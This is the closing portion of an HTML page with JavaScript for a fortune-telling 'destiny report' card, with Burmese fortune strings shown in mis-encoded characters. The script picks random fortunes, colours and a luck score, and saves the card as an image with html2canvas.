                "·Äú·Äª·Äæ·Ä≠·ÄØ·Ä∑·Äù·Äæ·ÄÄ·Ä∫·ÄÅ·Äª·ÄÄ·Ä∫·Äê·ÄÖ·Ä∫·ÄÅ·ÄØ·ÄÄ·Ä≠·ÄØ ·Äô·Äô·Äª·Äæ·Ä±·Ä¨·Ä∫·Äú·ÄÑ·Ä∑·Ä∫·Äò·Ä≤ ·Äû·Ä≠·Äú·Ä¨·Äõ·Äê·Äê·Ä∫·Äû·Ää·Ä∫·Åã",
                "·ÄÅ·ÄΩ·Ä±·Ä∏·Äü·Ä±·Ä¨·ÄÑ·Ä∫·ÄÅ·Ä∂·Äõ·Äê·Äê·Ä∫·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·Äú·Äô·Ä∫·Ä∏·Äû·ÄΩ·Ä¨·Ä∏·Äú·Äª·Äæ·ÄÑ·Ä∫ ·Äû·Äê·Ä≠·Äë·Ä¨·Ä∏·Äï·Ä´·Åã",
                "·Äö·Äî·Ä±·Ä∑ ·Äû·ÄÑ·Ä∑·Ä∫·Äô·Äª·ÄÄ·Ä∫·Äî·Äæ·Ä¨·ÄÄ ·Äï·ÄØ·Ä∂·Äô·Äæ·Äî·Ä∫·Äë·ÄÄ·Ä∫ ·Äï·Ä≠·ÄØ·Åç ·Äú·ÄÑ·Ä∫·Ä∏·Äú·ÄÄ·Ä∫·Äî·Ä±·Äû·Ää·Ä∫·Åã",
                "·Ä°·Äê·Ä≠·Äê·Ä∫·ÄÄ ·Äû·Ä∞·ÄÑ·Äö·Ä∫·ÄÅ·Äª·ÄÑ·Ä∫·Ä∏·Äü·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äê·ÄÖ·Ä∫·Ä¶·Ä∏ ·ÄÜ·ÄÄ·Ä∫·Äû·ÄΩ·Äö·Ä∫·Äú·Ä¨·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã",
                "·Äö·Äî·Ä±·Ä∑ ·Äò·Ä¨·Äú·ÄØ·Äï·Ä∫·Äú·ÄØ·Äï·Ä∫ ·Ä°·ÄÜ·ÄÑ·Ä∫·Äï·Äº·Ä±·ÄÅ·Äª·Ä±·Ä¨·Äô·ÄΩ·Ä±·Ä∑·Äî·Ä±·Äô·Ää·Ä∫·Åã",
                "·Ä°·ÄÖ·Ä¨·Ä∏·Ä°·Äû·Ä±·Ä¨·ÄÄ·Ä∫·ÄÄ·Äº·Ä±·Ä¨·ÄÑ·Ä∑·Ä∫ ·Äó·Ä≠·ÄØ·ÄÄ·Ä∫·Äî·Ä¨·Äê·Äê·Ä∫·Äû·Äñ·Äº·ÄÑ·Ä∑·Ä∫ ·Äû·Äê·Ä≠·Äë·Ä¨·Ä∏·Äï·Ä´·Åã",
                "·Äö·Äî·Ä±·Ä∑ ·ÄÄ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÖ·Ä±·Äû·Ä±·Ä¨ ·Ä°·Äõ·Ä±·Ä¨·ÄÑ·Ä∫·Äô·Äæ·Ä¨ ·Ä°·Äï·Äº·Ä¨·Äî·ÄØ·Äõ·Ä±·Ä¨·ÄÑ·Ä∫ ·Äñ·Äº·ÄÖ·Ä∫·Äû·Ää·Ä∫·Åã",
                "·Äû·ÄÑ·Ä∑·Ä∫·Äõ·Ä≤·Ä∑ ·ÄÄ·Ä∂·ÄÄ·Äº·Äô·Äπ·Äô·Ä¨·ÄÄ ·Äö·ÄÅ·ÄØ·Äô·Äæ·ÄÖ·Åç ·Äï·Äº·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·Äú·Ä≤·Äê·Ä±·Ä¨·Ä∑·Äô·Ää·Ä∫·Åã",
                "·Ä°·Ä≠·Äï·Ä∫·Äõ·Ä±·Ä∏·Äù·Äù·Ä°·Ä≠·Äï·Ä∫·Äï·Ä´·Åã ·ÄÄ·Ä∂·ÄÄ·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏·Äô·Äª·Ä¨·Ä∏ ·Äõ·Ä±·Ä¨·ÄÄ·Ä∫·Äú·Ä¨·Äï·Ä´·Äú·Ä≠·Äô·Ä∑·Ä∫·Äô·Ää·Ä∫·Åã"
            ];

            const colors = ["·Äõ·ÄΩ·Äæ·Ä±·Äõ·Ä±·Ä¨·ÄÑ·Ä∫ (Gold)", "·Ä°·Äï·Äº·Ä¨·Äî·ÄØ·Äõ·Ä±·Ä¨·ÄÑ·Ä∫ (Sky Blue)", "·Ä°·Äî·ÄÆ·Äõ·Ä±·Ä¨·ÄÑ·Ä∫ (Crimson Red)", "·Ä°·Äñ·Äº·Ä∞·Äõ·Ä±·Ä¨·ÄÑ·Ä∫ (White)", "·Ä°·Äî·ÄÄ·Ä∫·Äõ·Ä±·Ä¨·ÄÑ·Ä∫ (Black)"];

    // Random ·Äë·ÄØ·Äê·Ä∫·Äö·Ä∞·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏
            document.getElementById('luck-val').innerText = Math.floor(Math.random() * (100 - 85 + 1) + 85) + "%";
            document.getElementById('love-val').innerText = results[Math.floor(Math.random() * 10)]; // ·Äï·Äë·Äô ·ÅÅ·ÅÄ ·ÄÅ·ÄØ (Love)
            document.getElementById('wealth-val').innerText = results[Math.floor(Math.random() * (20 - 11 + 1) + 11)]; // Wealth
            document.getElementById('color-val').innerText = colors[Math.floor(Math.random() * colors.length)];
        }
        // --- Save Card Function (·Ä°·Äû·ÄÖ·Ä∫) ---
        function saveCard() {
            const element = document.getElementById("result-card");
            
            // html2canvas ·Ä°·Äû·ÄØ·Ä∂·Ä∏·Äï·Äº·ÄØ·Äï·Äº·ÄÆ·Ä∏ Card ·ÄÄ·Ä≠·ÄØ ·Äì·Ä¨·Äê·Ä∫·Äï·ÄØ·Ä∂·Äï·Äº·Ä±·Ä¨·ÄÑ·Ä∫·Ä∏·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏
            html2canvas(element, {
                backgroundColor: "#0a0e14", // Save ·Äú·ÄØ·Äï·Ä∫·Äê·Ä≤·Ä∑·Äï·ÄØ·Ä∂·Äõ·Ä≤·Ä∑ ·Äî·Ä±·Ä¨·ÄÄ·Ä∫·ÄÅ·Ä∂·Ä°·Äõ·Ä±·Ä¨·ÄÑ·Ä∫
                scale: 2 // ·Äï·ÄØ·Ä∂·ÄÄ·Äº·Ää·Ä∫·Äú·ÄÑ·Ä∫·Ä°·Ä±·Ä¨·ÄÑ·Ä∫ 2x Scale ·Äú·ÄØ·Äï·Ä∫·ÄÅ·Äº·ÄÑ·Ä∫·Ä∏
            }).then(canvas => {
                const link = document.createElement('a');
                link.download = 'destiny-report-' + userName + '.png';
                link.href = canvas.toDataURL();
                link.click();
            });
        }
    </script>
</body>
</html>
